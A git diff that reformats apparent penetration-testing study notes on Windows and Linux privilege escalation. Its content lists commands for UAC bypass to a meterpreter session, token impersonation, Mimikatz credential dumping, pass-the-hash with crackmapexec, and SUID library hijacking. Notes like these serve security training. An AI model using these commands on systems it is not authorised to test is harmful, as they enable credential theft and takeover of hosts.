@@ -1,26 +1,18 @@
 # 4 - Privilege Escalation
 
-## $\color{#009466}\textbf{Windows}$
+## Windows
 
 Note: if you have a valid user credential you can authenticate in windows target from SMB, RDP, WinRM\
 
 
-<details>
 
-<summary>$\huge{\text{Automation script}}$</summary>
+
+### Automation script
 
 * https://github.com/itm4n/PrivescCheck : useful for gather information
 * `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"` : run from command prompt
 
-\
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{UAC Bypass}}$</summary>
+### UAC Bypass
 
 * User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
 * Prerequisites:
@@ -42,15 +34,7 @@ Note: if you have a valid user credential you can authenticate in windows target
      * **NOTE FULL PATH**
   6. Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
 
-\
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{Impersonate Tokens}}$</summary>
+### Impersonate Tokens
 
 * With msfconsole: `load incognito`
 * `list_tokens -u`
@@ -77,15 +61,7 @@ Note: if you have a valid user credential you can authenticate in windows target
 * `getpid` : 2948
 * Of course you can repeat the process to become NT AUTHORITY\SYSTEM
 
-\
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{Password in configuration file (Unattend.xml)}}$</summary>
+### Password in configuration file (Unattend.xml)
 
 * An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.
 * ```
@@ -97,15 +73,7 @@ Note: if you have a valid user credential you can authenticate in windows target
   ```
 * Extract password and decode it (from base64)
 
-\
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{Credential Dumping (Mimikatz - Kiwi - Hashdump)}}$</summary>
+### Credential Dumping (Mimikatz - Kiwi - Hashdump)
 
 * Prerequisites: User must be a member a local Administrators.
 
@@ -126,15 +94,7 @@ Note: if you have a valid user credential you can authenticate in windows target
    * `lsadump::sam` : NTLM hashes for all of the user accounts on the system
    * `sekurlsa::logonpasswords` : To find the clear text passwords, but it's not always possible
 
-\
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{Pass the Hash}}$</summary>
+### Pass the Hash
 
 1. `crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"`
 2. Metasploit : windows/smb/psexec and set SMBPass with `<LM hash>:<NTLM hash>`
@@ -142,15 +102,7 @@ Note: if you have a valid user credential you can authenticate in windows target
      * `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
    * With `hashdump` you have the right format
 
-\
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{Other}}$</summary>
+### Other
 
 * Powershell History
 * Saved Windows Credentials
@@ -163,53 +115,24 @@ Note: if you have a valid user credential you can authenticate in windows target
 * Windows Privileges
 * Unpatched Software
 
-\
-\
+## Linux
 
-
-</details>
-
-## $\color{#009466}\textbf{Linux}$
-
-<details>
-
-<summary>$\huge{\text{Vulnerable program}}$</summary>
+### Vulnerable program
 
 * Search scripts that execute programs or programs. : Search for any vulnerable version. One example: chkrootkit v0.49 (running as root)
   * `ps aux`
 
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{Weak Permissions}}$</summary>
+### Weak Permissions
 
 * `find / -not -type l -perm -o+w` : world-writable files
   * Example: maybe you can edit shadow file...
 
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{Sudo}}$</summary>
+### Sudo
 
 * `sudo -l`
   * search on gtfobins how to exploit
 
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{SUID - custom binary}}$</summary>
+### SUID - custom binary
 
 * Premise: you have `binary_name` (with suid) that use/load/execute `loaded_binary`
 * Extract strings from the binary – look for shared libraries or binaries being loaded / executed at runtime
@@ -232,14 +155,7 @@ Note: if you have a valid user credential you can authenticate in windows target
 * `gcc binary.c -o <loaded_binary>` : compile
 * `./binary_name` : run the binary
 
-\
-
-
-</details>
-
-<details>
-
-<summary>$\huge{\text{Other}}$</summary>
+### Other
 
 * `sudo -l`
   * setenv?
@@ -277,12 +193,6 @@ Note: if you have a valid user credential you can authenticate in windows target
 * Kernel Exploits
 * Linpeas.sh
 * [GTFObins](https://gtfobins.github.io)
-
-\
-\
-
-
-</details>
 
 ## Resource
 
